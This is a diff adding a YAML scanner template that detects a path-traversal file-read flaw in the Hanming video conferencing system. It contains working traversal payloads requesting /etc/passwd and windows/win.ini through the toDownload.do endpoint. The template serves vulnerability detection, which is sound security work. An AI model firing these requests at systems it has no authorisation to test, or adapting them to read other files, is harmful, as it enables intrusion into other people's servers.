@@ -1,0 +1,26 @@
+id: hanming-video-conferencing-file-read
+
+info:
+    name: hanming-video-conferencing-file-read
+    author: kzaopa(https://github.com/kzaopa)
+    severity: high
+
+manual: true
+transport: http
+rules:
+    linux0:
+        request:
+            cache: true
+            method: GET
+            path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../etc/passwd
+            follow_redirects: false
+        expression: response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+    windows0:
+        request:
+            cache: true
+            method: GET
+            path: /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
+            follow_redirects: false
+        expression: response.status == 200 && (response.body.bcontains(b"for 16-bit app support") || response.body.bcontains(b"[extensions]"))
+expression: windows0() || linux0()
+
